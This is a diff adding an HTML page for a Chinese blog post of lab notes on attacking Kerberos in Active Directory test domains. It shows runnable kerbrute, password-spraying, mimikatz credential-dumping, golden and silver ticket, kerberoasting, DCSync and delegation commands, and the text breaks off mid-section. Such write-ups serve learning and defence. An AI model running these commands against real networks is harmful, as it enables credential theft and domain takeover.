@@ -1,0 +1,1342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    <meta name="description" content="Hexo Theme Redefine">
+    <meta name="author" content="yuBetter">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-redefine.png">
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://example.com/2023/04/14/kerberos攻击/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Kerberos攻击">
+    <meta property="og:description" content="Hexo Theme Redefine">
+    <meta property="og:url" content="https://example.com2023/04/14/Kerberos攻击/">
+    
+    <meta property="og:site_name" content="Yu&#39;s Blog">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Kerberos攻击">
+    <meta name="twitter:description" content="Hexo Theme Redefine">
+    <meta name="twitter:image" content="/images/yubetter-logon.svg">
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/yubetter-logon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/yubetter-logon.svg">
+    <meta name="theme-color" content="#005080">
+    <link rel="shortcut icon" href="/images/yubetter-logon.svg">
+    
+    <title>
+        
+            Kerberos攻击 -
+        
+        Yu&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/assets/fonts.css">
+
+    
+    
+    
+    <script id="hexo-configurations">
+    let REDEFINE = window.REDEFINE || {};
+    REDEFINE.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    REDEFINE.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#005080","avatar":"/images/yubetter.svg","favicon":"/images/yubetter-logon.svg","og_image":{"enable":false,"image_url":null},"article_img_align":"center","right_side_width":"210px","content_max_width":"1000px","nav_color":{"left":"#f78736","right":"#367df7","transparency":35},"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_image":{"light":"https://evan.beee.top/img/wallhaven-wqery6-light.webp","dark":"https://evan.beee.top/img/wallhaven-wqery6-dark.webp"},"title_color":{"light":"#fff","dark":"#d1d1b6"},"font_sizes":{"title":"3.5rem","subtitle":"1.5rem"},"line_height":1.2,"title":"好好学习，天天向上","subtitle":{"enable":true,"list":["有远大志向而脚踏实地，有障碍失败而不言放弃","静以修生，俭以养德，非淡泊无以明志，非宁静无以致远","即使慢，驰而不息，纵会落后，纵会失败，但一定可以达到他所向的目标","穷且益坚，不坠青云之志","莫不有始，鲜克有终","靡不有初,鲜克有终"]},"custom_font":{"enable":false,"font_family":null,"font_url":null}},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_block":{"copy":true,"style":"mac","custom_font":{"enable":false,"font_family":null,"font_url":null}},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"1.2.1","friend_links":{"columns":2},"home_article":{"date_format":"auto","category":{"enable":true,"limit":3},"tag":{"enable":true,"limit":3}},"plugins":{"aplayer":{"enable":false,"audio":[{"name":null,"artist":null,"url":null,"cover":null},{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}}};
+    REDEFINE.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+    
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="menu-wrapper">
+    
+    <div class="menu-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Yu&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                            <li class="menu-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="menu-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="menu-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                    <li class="drawer-menu-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-menu-item flex-center">
+                        <a class="" 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            
+             
+                <div class="article-title">         
+                    <img src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/QQ%E5%9B%BE%E7%89%8720210428184652.jpg" alt="Kerberos攻击" />
+                    <h1 class="article-title-cover">Kerberos攻击</h1>
+                </div>
+            
+                
+            
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/yubetter.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">yuBetter</span>
+                            
+                                <span class="author-label">lol</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="pc">2023-04-14 21:35:20</span>
+        <span class="mobile">2023-04-14 21:35</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="pc">2023-04-14 21:36:10</span>
+            <span class="mobile">2023-04-14 21:36</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-file-word"></i>&nbsp;<span>6.2k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>25 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <h1 id=""><a href="#" class="headerlink" title=""></a></h1><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230404104911790.png"
+                      alt="image-20230404104911790"
+                ></p>
+<h2 id="AS-REQ-amp-AS-REP阶段攻击"><a href="#AS-REQ-amp-AS-REP阶段攻击" class="headerlink" title="AS_REQ&amp;AS_REP阶段攻击"></a>AS_REQ&amp;AS_REP阶段攻击</h2><h3 id="域内用户枚举"><a href="#域内用户枚举" class="headerlink" title="域内用户枚举"></a>域内用户枚举</h3><p>kerberos是一种认证协议，在第一阶段AS_REQ中当用户不存在时，返回包提示错误，用户存在时，密码正确，密码错误时返回包都不用一样</p>
+<p>利用这一点就可以枚举出域内用户</p>
+<p>三种状态的错误代码分别为：</p>
+<p>KRB5DC_ERR_PREAUTH_REQUIRED           需要额外的预认证（用户存在）<br>KRB5DC_ERR_CLIENT_REVOKED                  客户端凭证已被吊销（禁用 ）<br>KRB5DC_ERR_C_PRINCIPAL_UNKNOWN    在Kerberos数据库中找不到客户端（不存在）</p>
+<h6 id="枚举工具的使用"><a href="#枚举工具的使用" class="headerlink" title="枚举工具的使用"></a>枚举工具的使用</h6><p>kerbrute</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe userenum --dc 域控ip -d 域名 用户名字典.txt</span><br><span class="line">kerbrute_windows_amd64.exe userenum --dc 192.168.10.2 -d test.lab users.txt</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230404112100259.png"
+                      alt="image-20230404112100259"
+                ></p>
+<h3 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h3><p>在常规的爆破中，一般都是用很多密码取碰撞一个账户，很容易导致账号被锁定，密码喷洒时用一个密码去碰撞很多的账号，这个能有效避免账号被锁定</p>
+<h6 id="喷撒原理"><a href="#喷撒原理" class="headerlink" title="喷撒原理"></a>喷撒原理</h6><p>就是在确认用户存在过后就会发送一个AS_REQ请i去，密码正确就会返回一个AS_REP，否则返回</p>
+<p>KRB5KDC_ERP_PREAUTH_FAILED</p>
+<ol>
+<li>kerbrute工具</li>
+</ol>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe passwordspray --dc 192.168.10.2 -d test.lab users.txt yuwin7.com（密码）</span><br></pre></td></tr></table></figure></div>
+
+<ol start="2">
+<li><p>ADPwdSpray.py</p>
+<p>可以利用hash值进行喷洒</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">针对明文进行喷洒</span><br><span class="line">python2 ADPwdSpray.py 192.168.10.2 test.lab users.txt clearpassword 123.com(密码) tcp</span><br><span class="line"> </span><br><span class="line">针对哈希进行喷洒</span><br><span class="line">python2 ADPwdSpray.py 192.168.10.2 test.lab users.txt ntlmhash afffeba176210fad4628f0524bfe1942 udp</span><br></pre></td></tr></table></figure></div>
+
+
+</li>
+<li><p>DomainPasswordSpray.ps1</p>
+</li>
+</ol>
+<p>该工具需要在powershell环境中使用，powershell4.0不可用</p>
+<p>这个工具是利用LDAP从域中导出用户列表，然后去掉被锁定的用户，再用固定密码进行密码喷洒</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">自动从域中导出用户列表</span><br><span class="line">powershell -exec bypass</span><br><span class="line">Import-Module .\DomainPasswordSpray.ps1</span><br><span class="line">Invoke-DomainPasswordSpray -Password 密码</span><br><span class="line">指定用户列表，指定单个密码进行爆破</span><br><span class="line">Invoke-DomainPasswordSpray -Userlist users.txt -Domain test.lab -password yuwin2012.com（密码）</span><br><span class="line">指定用户、密码列表进行爆破，输出到特定文件中</span><br><span class="line"></span><br><span class="line">依次使用密码对账号进行匹配，简称喷洒</span><br><span class="line">Invoke-DomainPasswordSpray -Userlist users.txt -Domain test.lab -PasswordList pass.txt</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="AS-REP-Roasting攻击"><a href="#AS-REP-Roasting攻击" class="headerlink" title="AS_REP Roasting攻击"></a>AS_REP Roasting攻击</h3><p>AS_REP Roasting攻击是一种对用户账号进行离线爆破的攻击方式。</p>
+<p>比较局限，需要勾选“不需要kerberos预身份验证“，默认不勾选</p>
+<p>这个选项是第一步（AS_REQ&amp;AS_REP），主要是防止密码脱机爆破</p>
+<p>如果关闭之后</p>
+<p>就可以使域控不会作任何反应就会将TGT票据和加密hash的session Key 返回，就可以离线破解得到明文密码</p>
+<h3 id="黄金票据攻击"><a href="#黄金票据攻击" class="headerlink" title="黄金票据攻击"></a>黄金票据攻击</h3><p>在Keerberos认证协议中，所有用户的票据都是由krbtgt的NTLM哈希值加密的来的</p>
+<p>只要获取krbtgt的值就可以伪造任意用户的票据</p>
+<p>这种方式就叫做黄金票据攻击</p>
+<p>需要 域名、域sid、krbtgt哈希值、伪造的用户，这些信息（域控）</p>
+<p><code>whoami /user</code>获取域的sid值</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405165843784.png"
+                      alt="image-20230405165843784"
+                ></p>
+<p><code>net config workstation</code>查看所处域</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405165952637.png"
+                      alt="image-20230405165952637"
+                ></p>
+<p>获取krbtgt用户的hash</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz</span><br><span class="line">privilege::debug   提权</span><br><span class="line">lsadump::lsa /patch   获取krbtgt用户的hash，域的sid值</span><br><span class="line">lsadum::lsa /patch /user:krbtgt</span><br></pre></td></tr></table></figure></div>
+
+<p>不知道为什么krbtgt的NTLM值读不出来</p>
+<p>3240a50b789addc29388d03988e89209</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405170743855.png"
+                      alt="image-20230405170743855"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405113131030.png"
+                      alt="image-20230405113131030"
+                ></p>
+<p>然后利用得到的hash值，利用mimikatz生成黄金票据并导入（在其他域内机子中输入）</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">清除票据</span><br><span class="line">Kerberos::purge</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kerberos::golden /admin:Administrator /domain:hack-my.com /sid:S-1-5-21-3694414171-540705576-2292004015 /krbtgt:3240a50b789addc29388d03988e89209 /ticket:ticket.kirbi</span><br><span class="line"></span><br><span class="line">kerberos::golden /admin:Administrator /domain:hack-my.com /sid:域控sid /krbtgt:NTLM值（3240a50b789addc29388d03988e89209） /ticket:ticket.kirbi</span><br><span class="line"></span><br><span class="line">kerberos::ptt ticket.kirbi</span><br><span class="line"></span><br><span class="line">连接共享</span><br><span class="line">dir \\ip\c$</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406141213924.png"
+                      alt="image-20230406141213924"
+                ></p>
+<p>拒绝访问，不知道为啥</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406141242727.png"
+                      alt="image-20230406141242727"
+                ></p>
+<h2 id="TGS-REQ-amp-TGS-REP阶段攻击"><a href="#TGS-REQ-amp-TGS-REP阶段攻击" class="headerlink" title="TGS_REQ&amp;TGS_REP阶段攻击"></a>TGS_REQ&amp;TGS_REP阶段攻击</h2><h3 id="Kerberosast攻击"><a href="#Kerberosast攻击" class="headerlink" title="Kerberosast攻击"></a>Kerberosast攻击</h3><h6 id="前瞻知识"><a href="#前瞻知识" class="headerlink" title="前瞻知识"></a>前瞻知识</h6><p>SPN，是服务实例（http、mssql、mysql等服务）的唯一标识符</p>
+<p>kerberos认证过程是使用SPN将服务实例与服务登录账户相关联</p>
+<p>如果想使用Kerberos认证服务，必须正确的配置SPN</p>
+<p>一个账户有多个SPN</p>
+<h6 id="注册方式有两种："><a href="#注册方式有两种：" class="headerlink" title="注册方式有两种："></a>注册方式有两种：</h6><p>机器账户：一个服务的权限是Local System或者Network Service时，则SPN注册在机器账户下</p>
+<p>域用户账户：当权限是一个域用户时，则SPN是注册在域用户账户下</p>
+<p>注意攻击的是域用户</p>
+<h6 id="判断指令"><a href="#判断指令" class="headerlink" title="判断指令"></a>判断指令</h6><p>域环境下执行<code>setspn -q */*</code></p>
+<p>以CN开头的每一行代表一个帐户，其下的信息是与该帐户相关联的SPN,默认有三个：</p>
+<p>域控制器：CN&#x3D;DC,OU&#x3D;Domain Controllers,DC&#x3D;laosec,DC&#x3D;cn</p>
+<p>域用户帐户：CN&#x3D;krbtgt,CN&#x3D;Users,DC&#x3D;laosec,DC&#x3D;cn</p>
+<p>机器帐户：CN&#x3D;WIN7,CN&#x3D;Computers,DC&#x3D;laosec,DC&#x3D;cn</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405145700825.png"
+                      alt="image-20230405145700825"
+                ></p>
+<h6 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h6><p>攻击者对一个域进行身份认证，然后获得TGT，用于之后的ST请求</p>
+<p>攻击者使用TGT发出ST服务票据请求，获得特定形式的SPN，具有唯一性</p>
+<p>ST服务票据以服务回复的形式发送回攻击者</p>
+<p>攻击者从TGS_REP中提取加密的服务票证，利用离线破解就可以恢复明文密码</p>
+<h6 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h6><p>使用mimikatz请求</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ask /target:SQLServer/mssql.hacker.lab:1433/MSSQL  请求服务票据</span><br><span class="line">Kerberos::list            列出服务票据</span><br><span class="line">l=kerberos::purge         清除所有票据</span><br><span class="line">kerberos::list /export    导出所有票据</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/2670873-20220816105758937-1080046002.png"
+                      alt="img"
+                ></p>
+<p>导出票据</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405152303985.png"
+                      alt="image-20230405152303985"
+                ></p>
+<p>破解票据</p>
+<p>使用kerberosast中的tgsrepcrack.py破解</p>
+<p><code>python3 tgsrepcrack.py wordlist.txt test.kirbi</code></p>
+<p>即可破解出明文密码</p>
+<h3 id="白银票据攻击"><a href="#白银票据攻击" class="headerlink" title="白银票据攻击"></a>白银票据攻击</h3><p>可以说是为了找krbtgt的hash值，为后续黄金票据提供必要条件</p>
+<p>黄金票据是伪造TGT，而白银票据是伪造ST</p>
+<p>客户是带着ST，server对其进行认证，解密ST得到session key，key再解密就认证成功了，就允许访问服务了</p>
+<p>所以我们能够明白，只要知道Server用户hash就可以伪造出一个ST，且不会经过KDC，这个票据只对部分服务有效</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">条件</span><br><span class="line">1.域名</span><br><span class="line">2.域sid</span><br><span class="line">3.目标服务器名</span><br><span class="line">4.可利用的服务</span><br><span class="line">5.服务账号的NTLM HASH</span><br><span class="line">6.需要伪造的用户名</span><br></pre></td></tr></table></figure></div>
+
+<h6 id="基本信息获取（SID，所处域，服务器名，NTLM-HASH）-域控"><a href="#基本信息获取（SID，所处域，服务器名，NTLM-HASH）-域控" class="headerlink" title="基本信息获取（SID，所处域，服务器名，NTLM HASH）(域控)"></a>基本信息获取（SID，所处域，服务器名，NTLM HASH）(域控)</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SID和所处域参考上面</span><br><span class="line">whoami /user </span><br><span class="line">net config workstation</span><br><span class="line"></span><br><span class="line">获取服务账号hash</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords&quot; </span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405154632357.png"
+                      alt="image-20230405154632357"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405154752324.png"
+                      alt="image-20230405154752324"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405154949583.png"
+                      alt="image-20230405154949583"
+                ></p>
+<p>所有信息收集完全后就可以制作白银票据</p>
+<p>先清除一下系统票据（域控）</p>
+<p>klist purge</p>
+<p>mimikatz</p>
+<p>kerberos::purge</p>
+<h6 id="伪造共享文件夹服务（cifs）权限，mimkatz-域内其他主机"><a href="#伪造共享文件夹服务（cifs）权限，mimkatz-域内其他主机" class="headerlink" title="伪造共享文件夹服务（cifs）权限，mimkatz(域内其他主机)"></a>伪造共享文件夹服务（cifs）权限，mimkatz(域内其他主机)</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">klist purge  清除票据（cmd）</span><br><span class="line"></span><br><span class="line">kerberos::golden /domain:hack-my.com /sid:S-1-5-21-3694414171-540705576-2292004015 /target:dc.hack-my.com /service:cifs /rc4:509c91e48a75dab92d5ae7d888cebc8a /user:aaaa /ptt</span><br><span class="line"></span><br><span class="line">kerberos::golden /domain:域名 /sid:域sid /target:目标服务器 /service:目标服务 /rc4:目标服务器的hash /user:xxx用户名 /ptt</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405160752134.png"
+                      alt="image-20230405160752134"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405160808470.png"
+                      alt="image-20230405160808470"
+                ></p>
+<p>票据注入成功了，但是不知道为啥还是拒绝访问</p>
+<h6 id="伪造LDAP服务权限"><a href="#伪造LDAP服务权限" class="headerlink" title="伪造LDAP服务权限"></a>伪造LDAP服务权限</h6><h6 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h6><p>制作一个票据（注意sid中要去掉末尾的-500），接下来就可以使用生成的票据进行攻击</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:hack-my.com /sid:S-1-5-21-3694414171-540705576-2292004015 /target:dc.hack-my.com /service:ldap /rc4:509c91e48a75dab92d5ae7d888cebc8a /user:aaaa /ptt</span><br><span class="line"></span><br><span class="line">只需要把服务名改成/service:ldap即可</span><br><span class="line"></span><br><span class="line">参考:https://blog.csdn.net/weixin_39851261/article/details/112076055</span><br></pre></td></tr></table></figure></div>
+
+<p>mimikatz使用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /dc:dc.hack-my.com /domain:hack-my.com /user:krbtgt</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync 向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。 需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户 只读域控制器默认不允许读取用户密码数据</span><br></pre></td></tr></table></figure></div>
+
+<p>按理说就可以获得krbtgt的值了，像这样</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405165048733.png"
+                      alt="image-20230405165048733"
+                ></p>
+<p>但是我的报错了，出不来，不知道是不是环境问题</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230405165127338.png"
+                      alt="image-20230405165127338"
+                ></p>
+<p>第二天再试一次就可以了，奇奇怪怪的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406135943742.png"
+                      alt="image-20230406135943742"
+                ></p>
+<p>获得krbtgt的hash值就可以进行黄金票据的构造了</p>
+<h3 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h3><p>在现实情况下，多个服务往往不能在一台机器中</p>
+<p>比如，用户在使用服务A时，需要服务B上的数据，最简单的方式就是A帮B去请求返回相应的信息</p>
+<p>而这个过程就称之为委派</p>
+<p>委派攻击分为：非约束委派、约束委派、基于资源三种</p>
+<h4 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h4><p>当一个服务servicel开启非约束委派后，用户user访问servicel后，servicel就保存user的TGT票据，然后servicel就可以用user的身份来访问域中user可以访问所有服务</p>
+<p>如果域管理员访问了一个开启非约束委派的服务，那这个服务就会将域管理员的TGT保存在内存中，这样就可以获得域管理员权限了</p>
+<p>实验环境：win2008 域内机器  win2012域控</p>
+<p>win2008的Alice用户是普通域内机器，默认没开启委派</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406112617697.png"
+                      alt="image-20230406112617697"
+                ></p>
+<p>接下来就要开启委派了，给域用户注册SPN</p>
+<p>域控主机上执行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A priv/test Alice</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406112814369.png"
+                      alt="image-20230406112814369"
+                ></p>
+<p>然后查看Alice，发现多了个委派，设置为非约束委派</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230406113052810.png"
+                      alt="image-20230406113052810"
+                ></p>
+<p>查询域内设置了非约束委派的服务账户</p>
+<p>Alice上执行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=hack-my,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
